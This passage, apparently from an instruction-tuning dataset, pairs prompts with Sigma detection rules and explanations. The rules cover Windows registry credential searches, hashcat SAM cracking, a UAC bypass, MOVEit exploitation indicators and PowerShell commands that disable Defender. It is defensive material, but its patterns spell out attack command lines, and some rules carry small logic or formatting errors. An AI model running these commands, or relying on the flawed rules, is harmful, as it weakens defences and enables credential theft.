      "answer": "In order to detect adversaries searching the Registry on compromised systems for insecurely stored credentials, you should monitor for signs of registry querying activities that focus on extracting sensitive information. Specifically, look for the creation of processes associated with the Windows Registry Editor tool, reg.exe. The detection mechanism should trigger alerts when reg.exe processes are observed executing commands that involve querying ('query') the registry with specific parameters targeting string values ('REG_SZ'), conducted in a recursive manner ('/s'), and filtering for types ('/t'). Additionally, detection should be honed in on commands that attempt to search ('/f') within critical registry hives such as HKLM (HKEY_LOCAL_MACHINE) and HKCU (HKEY_CURRENT_USER), including specific paths known to store configurations related to software like PuTTY under HKCU\\Software\\SimonTatham\\PuTTY\\Sessions. Such activities are indicative of attempts by adversaries to retrieve insecurely stored credentials from the registry, which could be used to facilitate further attacks or gains. The level of alert for this detection is considered medium, indicating a noteworthy severity that should prompt investigation, despite the potential for unknown false positives. This approach aligns with the methodology to secure systems against attackers leveraging registry information, particularly focusing on the credential access technique through registry data mining."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting stopping of a Windows service.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the stopping of a Windows service, you should focus on monitoring the creation of processes within Windows environments. Specifically, pay attention to instances where the process being initiated is either 'net.exe' or 'net1.exe'. These executables are commonly used in Windows for network-related tasks, including the control of services. Detection should be based on two main criteria:\n\n1. The original file name being exactly 'net.exe' or 'net1.exe'. Additionally, be vigilant for processes where the image path ends with '\\net.exe' or '\\net1.exe'. This ensures the detection of these executables irrespective of their location in the file system.\n\n2. The presence of the 'stop' command within the command line used to initiate the process. This is indicative of an attempt to stop a service using the net utility.\n\nBoth of these detection vectors need to be met for an alert to be considered valid. However, it's important to note that there are numerous legitimate reasons for stopping a service in a Windows environment. Due to this, the level of suspicion for this activity is rated as low, and there might be a substantial number of false positives. It\u2019s crucial for security analysts to filter these alerts through the lens of their specific environment's normal operations to discern between benign and potentially malicious activity effectively. This monitoring strategy aligns with understanding tactics and techniques associated with adversarial manipulation of services, though the intent can vary widely, from benign administrative tasks to potentially malicious actions such as disrupting security services.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName:\n            - 'net.exe'\n            - 'net1.exe'\n        - Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n    selection_cli:\n        CommandLine|contains: ' stop '\n    condition: all of selection_*\nfalsepositives:\n    - There are many legitimate reasons to stop a service. This rule isn't looking for any suspicious behaviour in particular. Filter legitimate activity accordingly\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName:\n            - 'net.exe'\n            - 'net1.exe'\n        - Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n    selection_cli:\n        CommandLine|contains: ' stop '\n    condition: all of selection_*\nfalsepositives:\n    - There are many legitimate reasons to stop a service. This rule isn't looking for any suspicious behaviour in particular. Filter legitimate activity accordingly\nlevel: low\n",
      "question": "stopping of a Windows service",
      "answer": "In order to detect the stopping of a Windows service, you should focus on monitoring the creation of processes within Windows environments. Specifically, pay attention to instances where the process being initiated is either 'net.exe' or 'net1.exe'. These executables are commonly used in Windows for network-related tasks, including the control of services. Detection should be based on two main criteria:\n\n1. The original file name being exactly 'net.exe' or 'net1.exe'. Additionally, be vigilant for processes where the image path ends with '\\net.exe' or '\\net1.exe'. This ensures the detection of these executables irrespective of their location in the file system.\n\n2. The presence of the 'stop' command within the command line used to initiate the process. This is indicative of an attempt to stop a service using the net utility.\n\nBoth of these detection vectors need to be met for an alert to be considered valid. However, it's important to note that there are numerous legitimate reasons for stopping a service in a Windows environment. Due to this, the level of suspicion for this activity is rated as low, and there might be a substantial number of false positives. It\u2019s crucial for security analysts to filter these alerts through the lens of their specific environment's normal operations to discern between benign and potentially malicious activity effectively. This monitoring strategy aligns with understanding tactics and techniques associated with adversarial manipulation of services, though the intent can vary widely, from benign administrative tasks to potentially malicious actions such as disrupting security services."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against, you should: monitor the process creation logs on Windows systems for instances where the 'hashcat.exe' application is executed. Specifically, look for executions of 'hashcat.exe' that include the command line flags '-a ', '-m 1000 ', and '-r ', which are indicative of an attack that utilizes Hashcat to crack Windows account passwords by leveraging the SAM file and a list of passwords. Be aware that there may be false positives, as other tools might use similar command line arguments. The severity of this detection is considered high, underscoring the importance of vigilance against such activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\hashcat.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '-a '\n            - '-m 1000 '\n            - '-r '\n    condition: 1 of selection_*\nfalsepositives:\n    - Tools that use similar command line flags and values\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\hashcat.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '-a '\n            - '-m 1000 '\n            - '-r '\n    condition: 1 of selection_*\nfalsepositives:\n    - Tools that use similar command line flags and values\nlevel: high\n",
      "question": "Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against",
      "answer": "In order to execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against, you should: monitor the process creation logs on Windows systems for instances where the 'hashcat.exe' application is executed. Specifically, look for executions of 'hashcat.exe' that include the command line flags '-a ', '-m 1000 ', and '-r ', which are indicative of an attack that utilizes Hashcat to crack Windows account passwords by leveraging the SAM file and a list of passwords. Be aware that there may be false positives, as other tools might use similar command line arguments. The severity of this detection is considered high, underscoring the importance of vigilance against such activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting pattern of UAC Bypass using scheduled tasks and variable expansion of cleanmgr.exe (UACMe 34).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the pattern of UAC Bypass using scheduled tasks and variable expansion of cleanmgr.exe (UACMe 34), you should monitor for process creation events on Windows systems. Specifically, look for instances where the command line ends with \"\\system32\\cleanmgr.exe /autoclean /d C:\", originating from a parent process with the command line \"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\". Additionally, these processes must be running with either high integrity levels or system integrity levels. This behavior is indicative of attempts to bypass User Account Control (UAC) using a technique involving scheduled tasks and the exploitation of the Windows cleanmgr.exe utility. Be aware that detections of this nature are considered high-level threats, although it is acknowledged that there could be unknown scenarios where this behavior might not indicate malicious activity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|endswith: '\"\\system32\\cleanmgr.exe /autoclean /d C:'\n        ParentCommandLine: 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|endswith: '\"\\system32\\cleanmgr.exe /autoclean /d C:'\n        ParentCommandLine: 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "pattern of UAC Bypass using scheduled tasks and variable expansion of cleanmgr.exe (UACMe 34)",
      "answer": "In order to detect the pattern of UAC Bypass using scheduled tasks and variable expansion of cleanmgr.exe (UACMe 34), you should monitor for process creation events on Windows systems. Specifically, look for instances where the command line ends with \"\\system32\\cleanmgr.exe /autoclean /d C:\", originating from a parent process with the command line \"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\". Additionally, these processes must be running with either high integrity levels or system integrity levels. This behavior is indicative of attempts to bypass User Account Control (UAC) using a technique involving scheduled tasks and the exploitation of the Windows cleanmgr.exe utility. Be aware that detections of this nature are considered high-level threats, although it is acknowledged that there could be unknown scenarios where this behavior might not indicate malicious activity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting adversary creating screen capture of a full with xwd. Highly recommended using rule on servers, due high usage of screenshot utilities on user workstations.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect an adversary creating a screen capture of the full screen with xwd, which is highly recommended for use on servers due to the high usage of screenshot utilities on user workstations, you should monitor for specific activities tracked by the Linux audit daemon (auditd). Specifically, look for the execution of the 'xwd' command, which is known for its ability to take screenshots. This detection focuses on two scenarios: one where the screenshot is taken of the root window, and another where it might not be. For the root window case, the presence of the '-root', '-out', and a filename ending with '.xwd' in the command line arguments is essential. In scenarios not involving the root window, the command line should include '-out' followed by a filename ending with '.xwd'. It is important to note that there might be legitimate uses of this screenshot utility, which could lead to false positives. This activity is associated with the MITRE ATT&CK tactics and techniques but should be viewed with caution due to the potential for legitimate use.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        type: EXECVE\n        a0: xwd\n    xwd_root_window:\n        a1: '-root'\n        a2: '-out'\n        a3|endswith: '.xwd'\n    xwd_no_root_window:\n        a1: '-out'\n        a2|endswith: '.xwd'\n    condition: selection and 1 of xwd_*\nfalsepositives:\n    - Legitimate use of screenshot utility\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        type: EXECVE\n        a0: xwd\n    xwd_root_window:\n        a1: '-root'\n        a2: '-out'\n        a3|endswith: '.xwd'\n    xwd_no_root_window:\n        a1: '-out'\n        a2|endswith: '.xwd'\n    condition: selection and 1 of xwd_*\nfalsepositives:\n    - Legitimate use of screenshot utility\nlevel: low\n",
      "question": "adversary creating screen capture of a full with xwd. Highly recommended using rule on servers, due high usage of screenshot utilities on user workstations",
      "answer": "In order to detect an adversary creating a screen capture of the full screen with xwd, which is highly recommended for use on servers due to the high usage of screenshot utilities on user workstations, you should monitor for specific activities tracked by the Linux audit daemon (auditd). Specifically, look for the execution of the 'xwd' command, which is known for its ability to take screenshots. This detection focuses on two scenarios: one where the screenshot is taken of the root window, and another where it might not be. For the root window case, the presence of the '-root', '-out', and a filename ending with '.xwd' in the command line arguments is essential. In scenarios not involving the root window, the command line should include '-out' followed by a filename ending with '.xwd'. It is important to note that there might be legitimate uses of this screenshot utility, which could lead to false positives. This activity is associated with the MITRE ATT&CK tactics and techniques but should be viewed with caution due to the potential for legitimate use."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting file indicators of potential exploitation of MOVEit CVE-2023-34362..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect file indicators of potential exploitation of MOVEit CVE-2023-34362, you should focus on monitoring Windows file events, specifically looking for activities that might indicate an attack. This involves scrutinizing various file creations, modifications, and actions that are unusual or indicative of exploitation patterns associated with this specific vulnerability.\n\nFirstly, you should watch for any file activities involving the directories related to MOVEit Transfer, particularly any actions within the `\\MOVEit Transfer\\wwwroot\\` or `\\MOVEitTransfer\\wwwroot\\` paths. This focus ensures that the surveillance is appropriately narrowed down to the MOVEit environments, hence reducing noise from irrelevant data.\n\nPay particular attention to files that end with extensions commonly associated with potentially malicious activities or scripts. These extensions include `.7z`, `.bat`, `.dll`, `.exe`, `.ps1`, `.rar`, `.vbe`, `.vbs`, and `.zip`. The appearance of such files under the MOVEit Transfer directories could signify unauthorized attempts to upload or modify executable or compressed files, which could be leveraged in an exploitation attempt.\n\nAdditionally, keep an eye out for known indicators of compromise (IoCs) specifically named files such as occurrences of `_human2.aspx`, `_human2.aspx.lnk`, `human2.aspx`, and `human2.aspx.lnk` under the MOVEit Transfer directories. These file names, especially when appearing in conjunction with `.lnk` or directly as `.aspx` files, are strong indicators of attempted or successful exploitation.\n\nFurther, be vigilant for newly compiled ASP.NET files within the `\\Windows\\Microsoft.net\\Framework64\\v` directory that falls under the `\\Temporary ASP.NET Files\\` path and contain the string `App_Web_` in their names. These should have a creation date within the months following the disclosure of CVE-2023-34362, specifically from March to June 2023, and end with `.dll`. This pattern could indicate the deployment of malicious ASP.NET applications intended to exploit or maintain persistence within the affected MOVEit environment.\n\nIt is also essential to apply this monitoring specifically to MOVEit servers to minimize false positives. This targeted approach ensures that the detection efforts are highly relevant and focused on the environments at risk from this vulnerability.\n\nBy actively monitoring for these signs and applying these detection strategies, organizations can significantly enhance their ability to identify potential exploitation attempts of MOVEit CVE-2023-34362. This proactive stance is critical for mitigating the vulnerability's impact and securing affected systems.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_event\n    product: windows\ndetection:\n    selection_generic:\n        TargetFilename|contains:\n            - '\\MOVEit Transfer\\wwwroot\\'\n            - '\\MOVEitTransfer\\wwwroot\\'\n        TargetFilename|endswith:\n            - '.7z'\n            - '.bat'\n            - '.dll'\n            - '.exe'\n            - '.ps1'\n            - '.rar'\n            - '.vbe'\n            - '.vbs'\n            - '.zip'\n    selection_known_ioc:\n        TargetFilename|endswith:\n            - '\\MOVEit Transfer\\wwwroot\\_human2.aspx.lnk'\n            - '\\MOVEit Transfer\\wwwroot\\_human2.aspx'\n            - '\\MOVEit Transfer\\wwwroot\\human2.aspx.lnk'\n            - '\\MOVEit Transfer\\wwwroot\\human2.aspx'\n            - '\\MOVEitTransfer\\wwwroot\\_human2.aspx.lnk'\n            - '\\MOVEitTransfer\\wwwroot\\_human2.aspx'\n            - '\\MOVEitTransfer\\wwwroot\\human2.aspx.lnk'\n            - '\\MOVEitTransfer\\wwwroot\\human2.aspx'\n    # Uncomment selection if you wanna threat hunt for additional artifacts\n    #selection_cmdline:\n    #    TargetFilename|contains: ':\\Windows\\TEMP\\'\n    #    TargetFilename|endswith: '.cmdline'\n    selection_compiled_asp:\n        CreationUtcTime|startswith:\n            - '2023-03- '\n            - '2023-04- '\n            - '2023-05- '\n            - '2023-06- '\n        TargetFilename|contains|all:\n            - '\\Windows\\Microsoft.net\\Framework64\\v'\n            - '\\Temporary ASP.NET Files\\'\n            - 'App_Web_'\n        TargetFilename|endswith: '.dll'\n    condition: 1 of selection_*\nfalsepositives:\n    - To avoid FP, this rule should only be applied on MOVEit servers.\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_event\n    product: windows\ndetection:\n    selection_generic:\n        TargetFilename|contains:\n            - '\\MOVEit Transfer\\wwwroot\\'\n            - '\\MOVEitTransfer\\wwwroot\\'\n        TargetFilename|endswith:\n            - '.7z'\n            - '.bat'\n            - '.dll'\n            - '.exe'\n            - '.ps1'\n            - '.rar'\n            - '.vbe'\n            - '.vbs'\n            - '.zip'\n    selection_known_ioc:\n        TargetFilename|endswith:\n            - '\\MOVEit Transfer\\wwwroot\\_human2.aspx.lnk'\n            - '\\MOVEit Transfer\\wwwroot\\_human2.aspx'\n            - '\\MOVEit Transfer\\wwwroot\\human2.aspx.lnk'\n            - '\\MOVEit Transfer\\wwwroot\\human2.aspx'\n            - '\\MOVEitTransfer\\wwwroot\\_human2.aspx.lnk'\n            - '\\MOVEitTransfer\\wwwroot\\_human2.aspx'\n            - '\\MOVEitTransfer\\wwwroot\\human2.aspx.lnk'\n            - '\\MOVEitTransfer\\wwwroot\\human2.aspx'\n    # Uncomment selection if you wanna threat hunt for additional artifacts\n    #selection_cmdline:\n    #    TargetFilename|contains: ':\\Windows\\TEMP\\'\n    #    TargetFilename|endswith: '.cmdline'\n    selection_compiled_asp:\n        CreationUtcTime|startswith:\n            - '2023-03- '\n            - '2023-04- '\n            - '2023-05- '\n            - '2023-06- '\n        TargetFilename|contains|all:\n            - '\\Windows\\Microsoft.net\\Framework64\\v'\n            - '\\Temporary ASP.NET Files\\'\n            - 'App_Web_'\n        TargetFilename|endswith: '.dll'\n    condition: 1 of selection_*\nfalsepositives:\n    - To avoid FP, this rule should only be applied on MOVEit servers.\nlevel: high\n",
      "question": "file indicators of potential exploitation of MOVEit CVE-2023-34362.",
      "answer": "In order to detect file indicators of potential exploitation of MOVEit CVE-2023-34362, you should focus on monitoring Windows file events, specifically looking for activities that might indicate an attack. This involves scrutinizing various file creations, modifications, and actions that are unusual or indicative of exploitation patterns associated with this specific vulnerability.\n\nFirstly, you should watch for any file activities involving the directories related to MOVEit Transfer, particularly any actions within the `\\MOVEit Transfer\\wwwroot\\` or `\\MOVEitTransfer\\wwwroot\\` paths. This focus ensures that the surveillance is appropriately narrowed down to the MOVEit environments, hence reducing noise from irrelevant data.\n\nPay particular attention to files that end with extensions commonly associated with potentially malicious activities or scripts. These extensions include `.7z`, `.bat`, `.dll`, `.exe`, `.ps1`, `.rar`, `.vbe`, `.vbs`, and `.zip`. The appearance of such files under the MOVEit Transfer directories could signify unauthorized attempts to upload or modify executable or compressed files, which could be leveraged in an exploitation attempt.\n\nAdditionally, keep an eye out for known indicators of compromise (IoCs) specifically named files such as occurrences of `_human2.aspx`, `_human2.aspx.lnk`, `human2.aspx`, and `human2.aspx.lnk` under the MOVEit Transfer directories. These file names, especially when appearing in conjunction with `.lnk` or directly as `.aspx` files, are strong indicators of attempted or successful exploitation.\n\nFurther, be vigilant for newly compiled ASP.NET files within the `\\Windows\\Microsoft.net\\Framework64\\v` directory that falls under the `\\Temporary ASP.NET Files\\` path and contain the string `App_Web_` in their names. These should have a creation date within the months following the disclosure of CVE-2023-34362, specifically from March to June 2023, and end with `.dll`. This pattern could indicate the deployment of malicious ASP.NET applications intended to exploit or maintain persistence within the affected MOVEit environment.\n\nIt is also essential to apply this monitoring specifically to MOVEit servers to minimize false positives. This targeted approach ensures that the detection efforts are highly relevant and focused on the environments at risk from this vulnerability.\n\nBy actively monitoring for these signs and applying these detection strategies, organizations can significantly enhance their ability to identify potential exploitation attempts of MOVEit CVE-2023-34362. This proactive stance is critical for mitigating the vulnerability's impact and securing affected systems."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect set DisallowRun to 1 to prevent user running specific computer program.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect set DisallowRun to 1 to prevent user running specific computer program, you should: Monitor the Windows registry for modifications where an event of type SetValue targets the specific registry key path ending with 'Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun'. Specifically, detect changes where the Details of the modification suggest that the DisallowRun feature is being enabled, indicated by setting its value to 'DWORD (0x00000001)'. This action can potentially restrict users from running certain programs, which might be indicative of a system configuration change with potentially malicious intent or unauthorized control. It's important to note that false positives may exist as the exact intentions behind changing this setting can vary. The detection operates at a medium level of significance.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: 'Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun'\n        Details: 'DWORD (0x00000001)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: 'Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun'\n        Details: 'DWORD (0x00000001)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Detect set DisallowRun to 1 to prevent user running specific computer program",
      "answer": "In order to detect set DisallowRun to 1 to prevent user running specific computer program, you should: Monitor the Windows registry for modifications where an event of type SetValue targets the specific registry key path ending with 'Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun'. Specifically, detect changes where the Details of the modification suggest that the DisallowRun feature is being enabled, indicated by setting its value to 'DWORD (0x00000001)'. This action can potentially restrict users from running certain programs, which might be indicative of a system configuration change with potentially malicious intent or unauthorized control. It's important to note that false positives may exist as the exact intentions behind changing this setting can vary. The detection operates at a medium level of significance."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting requests to disable Microsoft Defender features using PowerShell commands.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect requests to disable Microsoft Defender features using PowerShell commands, you should monitor Windows process creation logs for specific command-line patterns. Focus on detecting instances where PowerShell commands such as 'Add-MpPreference' or 'Set-MpPreference' are used alongside options that aim to disable various Microsoft Defender safeguards. These include disabling real-time monitoring, input/output antivirus protection, behavior monitoring, and the \"block at first seen\" feature. Additionally, watch out for command lines containing '$true' or ' 1 ' which are indicative of enabling these disablement options.\n\nIt is also important to monitor for base64 encoded PowerShell commands that attempt to accomplish the same goals, as attackers may use encoding to evade detection. The presence of any part of these command sequences in the process creation logs, whether in plain text or base64 encoded, can be a strong indicator of an attack attempting to weaken the host's defenses.\n\nHowever, it must be noted that these PowerShell commands can also be used by system administrators for legitimate configurations. Therefore, identifying a true positive would involve context analysis beyond the mere detection of these commands to delineate between malicious activity and valid administrative tasks. The detection of these activities is considered critical due to their potential to significantly lower the defenses of the monitored system against malware and other threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains:\n            - 'Add-MpPreference '\n            - 'Set-MpPreference '\n    selection2:\n        CommandLine|contains:\n            - 'DisableRealtimeMonitoring '\n            - 'DisableIOAVProtection '\n            - 'DisableBehaviorMonitoring '\n            - 'DisableBlockAtFirstSeen '\n    selection3:\n        CommandLine|contains:\n            - '$true'\n            - ' 1 '\n    encoded_command:\n        CommandLine|base64offset|contains:\n            - 'DisableRealtimeMonitoring '\n            - 'DisableIOAVProtection '\n            - 'DisableBehaviorMonitoring '\n            - 'DisableBlockAtFirstSeen '\n            - 'disablerealtimemonitoring '\n            - 'disableioavprotection '\n            - 'disablebehaviormonitoring '\n            - 'disableblockatfirstseen '\n        CommandLine|contains:\n            - 'RABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 'EAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 'RABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIA'\n            - 'QAaQBzAGEAYgBsAGUASQBPAEEAVgBQAHIAbwB0AGUAYwB0AGkAbwBuACAA'\n            - 'EAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8AdABlAGMAdABpAG8AbgAgA'\n            - 'RABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 'EAGkAcwBhAGIAbABlAEIAZQBoAGEAdgBpAG8AcgBNAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 'RABpAHMAYQBiAGwAZQBCAGwAbwBjAGsAQQB0AEYAaQByAHMAdABTAGUAZQBuACAA'\n            - 'QAaQBzAGEAYgBsAGUAQgBsAG8AYwBrAEEAdABGAGkAcgBzAHQAUwBlAGUAbgAgA'\n            - 'EAGkAcwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AIA'\n            - 'ZABpAHMAYQBiAGwAZQByAGUAYQBsAHQAaQBtAGUAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAcgBlAGEAbAB0AGkAbQBlAG0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 'kAGkAcwBhAGIAbABlAHIAZQBhAGwAdABpAG0AZQBtAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 'ZABpAHMAYQBiAGwAZQBpAG8AYQB2AHAAcgBvAHQAZQBjAHQAaQBvAG4AIA'\n            - 'QAaQBzAGEAYgBsAGUAaQBvAGEAdgBwAHIAbwB0AGUAYwB0AGkAbwBuACAA'\n            - 'kAGkAcwBhAGIAbABlAGkAbwBhAHYAcAByAG8AdABlAGMAdABpAG8AbgAgA'\n            - 'ZABpAHMAYQBiAGwAZQBiAGUAaABhAHYAaQBvAHIAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAYgBlAGgAYQB2AGkAbwByAG0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 'kAGkAcwBhAGIAbABlAGIAZQBoAGEAdgBpAG8AcgBtAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 'ZABpAHMAYQBiAGwAZQBiAGwAbwBjAGsAYQB0AGYAaQByAHMAdABzAGUAZQBuACAA'\n            - 'QAaQBzAGEAYgBsAGUAYgBsAG8AYwBrAGEAdABmAGkAcgBzAHQAcwBlAGUAbgAgA'\n            - 'kAGkAcwBhAGIAbABlAGIAbABvAGMAawBhAHQAZgBpAHIAcwB0AHMAZQBlAG4AIA'\n    condition: all of selection* or encoded_command\nfalsepositives:\n    - Possible Admin Activity\n    - Other Cmdlets that may use the same parameters\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains:\n            - 'Add-MpPreference '\n            - 'Set-MpPreference '\n    selection2:\n        CommandLine|contains:\n            - 'DisableRealtimeMonitoring '\n            - 'DisableIOAVProtection '\n            - 'DisableBehaviorMonitoring '\n            - 'DisableBlockAtFirstSeen '\n    selection3:\n        CommandLine|contains:\n            - '$true'\n            - ' 1 '\n    encoded_command:\n        CommandLine|base64offset|contains:\n            - 'DisableRealtimeMonitoring '\n            - 'DisableIOAVProtection '\n            - 'DisableBehaviorMonitoring '\n            - 'DisableBlockAtFirstSeen '\n            - 'disablerealtimemonitoring '\n            - 'disableioavprotection '\n            - 'disablebehaviormonitoring '\n            - 'disableblockatfirstseen '\n        CommandLine|contains:\n            - 'RABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 'EAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 'RABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIA'\n            - 'QAaQBzAGEAYgBsAGUASQBPAEEAVgBQAHIAbwB0AGUAYwB0AGkAbwBuACAA'\n            - 'EAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8AdABlAGMAdABpAG8AbgAgA'\n            - 'RABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 'EAGkAcwBhAGIAbABlAEIAZQBoAGEAdgBpAG8AcgBNAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 'RABpAHMAYQBiAGwAZQBCAGwAbwBjAGsAQQB0AEYAaQByAHMAdABTAGUAZQBuACAA'\n            - 'QAaQBzAGEAYgBsAGUAQgBsAG8AYwBrAEEAdABGAGkAcgBzAHQAUwBlAGUAbgAgA'\n            - 'EAGkAcwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AIA'\n            - 'ZABpAHMAYQBiAGwAZQByAGUAYQBsAHQAaQBtAGUAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAcgBlAGEAbAB0AGkAbQBlAG0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 'kAGkAcwBhAGIAbABlAHIAZQBhAGwAdABpAG0AZQBtAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 'ZABpAHMAYQBiAGwAZQBpAG8AYQB2AHAAcgBvAHQAZQBjAHQAaQBvAG4AIA'\n            - 'QAaQBzAGEAYgBsAGUAaQBvAGEAdgBwAHIAbwB0AGUAYwB0AGkAbwBuACAA'\n            - 'kAGkAcwBhAGIAbABlAGkAbwBhAHYAcAByAG8AdABlAGMAdABpAG8AbgAgA'\n            - 'ZABpAHMAYQBiAGwAZQBiAGUAaABhAHYAaQBvAHIAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAYgBlAGgAYQB2AGkAbwByAG0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 'kAGkAcwBhAGIAbABlAGIAZQBoAGEAdgBpAG8AcgBtAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 